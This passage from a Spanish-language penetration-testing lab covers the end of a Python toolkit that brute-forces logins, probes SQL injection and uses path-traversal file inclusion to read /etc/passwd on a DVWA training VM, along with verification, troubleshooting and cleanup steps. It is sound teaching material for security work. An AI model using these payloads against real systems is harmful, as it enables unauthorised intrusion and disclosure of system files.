    resultados.append(resultado_brute)

    # ── Ejecutar módulo 2: SQL Injection ──────────────────────────────────────
    logger.info("\n")
    resultado_sqli = modulo_sqli(sesion)
    resultados.append(resultado_sqli)

    # ── Ejecutar módulo 3: LFI ────────────────────────────────────────────────
    logger.info("\n")
    resultado_lfi = modulo_lfi(sesion)
    resultados.append(resultado_lfi)

    # ── Generar reporte consolidado ───────────────────────────────────────────
    logger.info("\n")
    logger.info("=" * 60)
    logger.info("GENERANDO REPORTE CONSOLIDADO")
    generar_reporte(resultados, config.REPORT_FILE)

    # ── Resumen final en consola ──────────────────────────────────────────────
    logger.info("\n")
    logger.info("╔══════════════════════════════════════════════════════════╗")
    logger.info("║                    RESUMEN FINAL                        ║")
    logger.info("╠══════════════════════════════════════════════════════════╣")

    resumen_modulos = [
        ("Fuerza Bruta", resultado_brute.get("exito", False),
         f"Credencial: {resultado_brute.get('credencial_encontrada', 'No encontrada')}"),
        ("SQL Injection", resultado_sqli.get("vulnerabilidad_detectada", False),
         f"Indicadores: {resultado_sqli.get('indicadores_encontrados', [])}"),
        ("LFI", resultado_lfi.get("vulnerabilidad_detectada", False),
         f"Archivos: {resultado_lfi.get('archivos_incluidos', [])}"),
    ]

    for nombre, hallazgo, detalle in resumen_modulos:
        estado = "✓ HALLAZGO" if hallazgo else "- Sin hallazgo"
        logger.info(f"║  {nombre:<15} : {estado:<12} | {detalle[:35]}")

    logger.info("╠══════════════════════════════════════════════════════════╣")
    logger.info(f"║  Log       : {config.LOG_FILE[-45:]:<46}║")
    logger.info(f"║  Reporte   : {config.REPORT_FILE[-45:]:<46}║")
    logger.info("╚══════════════════════════════════════════════════════════╝")


if __name__ == "__main__":
    main()
```

2. Ejecuta el toolkit completo:

```bash
cd ~/lab05
source venv/bin/activate
export DVWA_URL="http://192.168.56.101/dvwa"

python3 dvwa_tester.py
```

**Salida esperada (resumen final):**

```
╔══════════════════════════════════════════════════════════╗
║                    RESUMEN FINAL                         ║
╠══════════════════════════════════════════════════════════╣
║  Fuerza Bruta    : ✓ HALLAZGO    | Credencial: {'usuario': 'admin', 'password': 'password'}
║  SQL Injection   : ✓ HALLAZGO    | Indicadores: ['You have an error in your SQL syntax', ...]
║  LFI             : ✓ HALLAZGO    | Archivos: ['/etc/passwd']
╠══════════════════════════════════════════════════════════╣
║  Log       : /root/lab05/results/dvwa_tester.log         ║
║  Reporte   : /root/lab05/results/report.json             ║
╚══════════════════════════════════════════════════════════╝
```

**Verificación:**

```bash
# Verificar que el reporte JSON se generó correctamente
python3 -c "
import json
with open('results/report.json') as f:
    r = json.load(f)
print('Módulos en reporte:', r['resumen']['total_modulos'])
print('Con hallazgos:', r['resumen']['modulos_con_hallazgos'])
for mod in r['resultados']:
    print(f\"  - {mod['modulo']}: evidencias={len(mod.get('evidencia', []))}\")
"
```

---

## 7. Validación y Pruebas

### Lista de Verificación de Resultados

Ejecuta los siguientes comandos para validar que el laboratorio se completó correctamente:

```bash
cd ~/lab05

# ── Verificación 1: Archivos generados ────────────────────────────────────────
echo "=== Verificación de archivos generados ==="
ls -lh results/
# Esperado: dvwa_tester.log y report.json con tamaño > 0

# ── Verificación 2: Sesión autenticada funcionó ───────────────────────────────
echo "=== Verificación de autenticación ==="
grep "Autenticación exitosa" results/dvwa_tester.log
# Esperado: línea con "✓ Autenticación exitosa"

# ── Verificación 3: Módulo de fuerza bruta encontró credencial ────────────────
echo "=== Verificación de fuerza bruta ==="
grep "CREDENCIAL VÁLIDA" results/dvwa_tester.log
# Esperado: línea con "✓ CREDENCIAL VÁLIDA ENCONTRADA" para 'password'

# ── Verificación 4: SQLi detectó vulnerabilidad ───────────────────────────────
echo "=== Verificación de SQLi ==="
grep "INDICADORES" results/dvwa_tester.log | head -3
# Esperado: al menos una línea con "✓ INDICADORES"

# ── Verificación 5: LFI leyó /etc/passwd ─────────────────────────────────────
echo "=== Verificación de LFI ==="
grep "ARCHIVO INCLUIDO\|root:x:0:0" results/dvwa_tester.log
# Esperado: línea con "✓ ARCHIVO INCLUIDO" y fragmento de /etc/passwd

# ── Verificación 6: Reporte JSON válido y completo ────────────────────────────
echo "=== Verificación de reporte JSON ==="
python3 -c "
import json, sys
with open('results/report.json') as f:
    r = json.load(f)
assert r['resumen']['total_modulos'] == 3, 'Faltan módulos en el reporte'
assert r['resumen']['modulos_con_hallazgos'] >= 2, 'Se esperan al menos 2 módulos con hallazgos'
print('✓ Reporte JSON válido y completo')
print(f'  Módulos: {r[\"resumen\"][\"total_modulos\"]}')
print(f'  Con hallazgos: {r[\"resumen\"][\"modulos_con_hallazgos\"]}')
"
```

### Verificación del Reporte JSON

```bash
# Inspeccionar el reporte de forma legible
python3 -m json.tool results/report.json | head -60
```

La salida debe mostrar la estructura JSON con `timestamp_reporte`, `objetivo`, `advertencia_legal` y los tres módulos de resultados con sus respectivas evidencias.

---

## 8. Resolución de Problemas

### Problema 1: `crear_sesion_autenticada()` retorna `None` — URL final no es `index.php`

**Síntomas:**
```
ERROR    | ✗ Autenticación fallida. URL final inesperada: http://192.168.56.101/dvwa/login.php
```
El script no puede autenticarse y todos los módulos subsiguientes fallan al acceder a los módulos vulnerables (reciben la página de login en lugar del módulo).

**Causa probable:**
El token CSRF no se extrajo correctamente del formulario, o la IP/URL de DVWA en `config.py` no es accesible. También puede ocurrir si DVWA no está en nivel *Low* y el formulario tiene una estructura diferente, o si la sesión PHP expiró entre el GET y el POST.

**Solución:**

```bash
# Paso 1: Verificar conectividad básica
curl -v http://192.168.56.101/dvwa/login.php 2>&1 | grep -E "< HTTP|Set-Cookie|user_token"
# Debe mostrar: HTTP/1.1 200 OK, Set-Cookie: PHPSESSID=..., user_token en el HTML

# Paso 2: Verificar que el token CSRF existe en el HTML
curl -s http://192.168.56.101/dvwa/login.php | grep "user_token"
# Debe mostrar: <input type='hidden' name='user_token' value='...' />

# Paso 3: Si la IP es incorrecta, actualizar la variable de entorno
export DVWA_URL="http://<IP_CORRECTA>/dvwa"
python3 dvwa_tester.py

# Paso 4: Si el problema persiste, verificar que DVWA está configurado en nivel Low
# Acceder al navegador: http://<IP>/dvwa/security.php → seleccionar Low → Submit

# Paso 5: Aumentar el timeout si la red es lenta
# En config.py: REQUEST_TIMEOUT = 20
```

---

### Problema 2: El módulo LFI no detecta la vulnerabilidad — `Δbytes: 0` en todos los payloads

**Síntomas:**
```
[LFI] '../../../etc/passwd'              → HTTP 200 | Δbytes: 0 | - Sin indicadores
[LFI] '/etc/passwd'                      → HTTP 200 | Δbytes: 0 | - Sin indicadores
Resultado LFI: - No concluyente
```
Todos los payloads LFI retornan exactamente el mismo tamaño de respuesta que la referencia, sin indicadores de archivo incluido.

**Causa probable:**
DVWA no está en nivel de seguridad **Low**. En nivel *Medium* o *High*, el módulo File Inclusion bloquea path traversal o solo permite archivos en el directorio local. También puede ocurrir si DVWA usa una versión con la vulnerabilidad LFI corregida, o si PHP tiene `open_basedir` configurado restrictivamente en Metasploitable 2.

**Solución:**

```bash
# Paso 1: Confirmar nivel de seguridad activo en DVWA
curl -s --cookie "PHPSESSID=<tu_sesion>" \
  http://192.168.56.101/dvwa/security.php | grep -i "security level\|dvwaSecurity"
# Debe mostrar: Low

# Paso 2: Cambiar nivel de seguridad a Low programáticamente
python3 -c "
import dvwa_tester as dt
import requests, config
sesion = dt.crear_sesion_autenticada()
if sesion:
    # Cambiar nivel de seguridad a Low
    resp = sesion.post(
        config.DVWA_SECURITY_URL,
        data={'security': 'low', 'seclev_submit': 'Submit'},
        timeout=10
    )
    print('Nivel cambiado, HTTP:', resp.status_code)
"

# Paso 3: Verificar manualmente en el navegador que el nivel es Low
# DVWA Security → debe mostrar 'Current Security Level: low'

# Paso 4: Probar el payload manualmente para aislar el problema
python3 -c "
import dvwa_tester as dt, config
sesion = dt.crear_sesion_autenticada()
if sesion:
    r = sesion.get(config.DVWA_LFI_URL,
                   params={'page': '../../../etc/passwd'}, timeout=10)
    print('Status:', r.status_code)
    print('Contiene root:x:', 'root:x:0:0' in r.text)
    print('Longitud:', len(r.text))
    # Si False: DVWA no está en nivel Low o la ruta LFI es diferente
"

# Paso 5: Si Metasploitable 2 usa una ruta diferente, ajustar en config.py
# DVWA_LFI_URL = f"{DVWA_BASE_URL}/vulnerabilities/fi/?page=include.php"
```

---

## 9. Limpieza del Entorno

Ejecuta los siguientes pasos al finalizar el laboratorio:

```bash
# ── 1. Desactivar entorno virtual ─────────────────────────────────────────────
deactivate

# ── 2. Cerrar sesión en DVWA (opcional, la sesión PHP expira sola) ─────────────
# Si deseas cerrar explícitamente:
python3 -c "
import requests, config
sesion = requests.Session()
sesion.get(f'{config.DVWA_BASE_URL}/logout.php', timeout=5)
print('Sesión cerrada')
" 2>/dev/null || true

# ── 3. Archivar resultados del laboratorio ─────────────────────────────────────
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
tar -czf ~/lab05_resultados_${TIMESTAMP}.tar.gz ~/lab05/results/
echo "Resultados archivados en: ~/lab05_resultados_${TIMESTAMP}.tar.gz"

# ── 4. Verificar que no hay credenciales en el código fuente ───────────────────
grep -rn "password\|api_key\|secret" ~/lab05/*.py | grep -v "config\." | grep -v "#"
# No debe mostrar credenciales hardcodeadas

# ── 5. Restaurar snapshot de Metasploitable 2 / DVWA ──────────────────────────
# Desde el host (no desde Kali):
VBoxManage controlvm "Metasploitable2" poweroff 2>/dev/null || true
sleep 3
VBoxManage snapshot "Metasploitable2" restore "pre-lab-05-00-01"
VBoxManage startvm "Metasploitable2" --type headless
echo "Snapshot restaurado. DVWA vuelve al estado limpio."

# ── 6. Limpiar variables de entorno sensibles ──────────────────────────────────
unset DVWA_URL DVWA_USER DVWA_PASS
```

> **Nota:** Los archivos en `~/lab05/results/` contienen evidencia de vulnerabilidades reales en DVWA. Aunque es un entorno de laboratorio, trata estos resultados con la misma discreción que aplicarías a un reporte de pentest real. No compartas el `report.json` fuera del entorno de laboratorio.

---

## 10. Resumen

### Conceptos Aplicados

En este laboratorio construiste un toolkit completo de pruebas de seguridad web automatizadas que integra directamente los fundamentos de HTTP estudiados en la Lección 5.1:

| Concepto HTTP (Lección 5.1)                 | Aplicación en el Lab                                                        |
|---------------------------------------------|-----------------------------------------------------------------------------|
| Solicitud/respuesta HTTP                    | Cada módulo envía solicitudes y analiza respuestas para detectar anomalías  |
| Códigos de estado (2xx, 3xx, 4xx)           | Verificación de autenticación (200 + URL final), detección de errores       |
| Cabeceras HTTP (Cookie, Set-Cookie)         | `requests.Session` gestiona automáticamente `PHPSESSID` entre solicitudes   |
| Métodos GET y POST                          | Login usa POST; módulos SQLi, LFI y Brute Force usan GET con parámetros     |
| Sin estado HTTP → mecanismos de sesión      | Token CSRF extraído con BeautifulSoup4 en cada solicitud para mantener estado|
| Cabeceras de respuesta como fuente de info  | Análisis de `Content-Length` implícito (longitud del cuerpo) para detectar SQLi/LFI |

### Habilidades Desarrolladas

- **`requests.Session`**: Mantenimiento de cookies y estado entre múltiples solicitudes al mismo servidor.
- **BeautifulSoup4**: Parsing de HTML para extracción de tokens CSRF de formularios.
- **Análisis diferencial de respuestas**: Comparar longitud y contenido entre respuesta de referencia y respuesta con payload para inferir vulnerabilidad.
- **Logging estructurado**: Registro de evidencia con timestamps para documentación de pruebas.
- **Reporte JSON**: Generación de evidencia estructurada y reproducible.

### Recursos Adicionales

- [OWASP Testing Guide v4.2 — OTG-AUTHN-003: Testing for Weak Lock Out Mechanism](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism)
- [OWASP Testing Guide v4.2 — OTG-INPVAL-005: Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [OWASP Testing Guide v4.2 — OTG-INPVAL-011: Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [Documentación requests — Session Objects](https://docs.python-requests.org/en/latest/user/advanced/#session-objects)
- [BeautifulSoup4 — Documentación oficial](https://www.crummy.com/software/BeautifulSoup/bs4/doc/)
- [DVWA — Documentación y guías de configuración](https://github.com/digininja/DVWA)

---
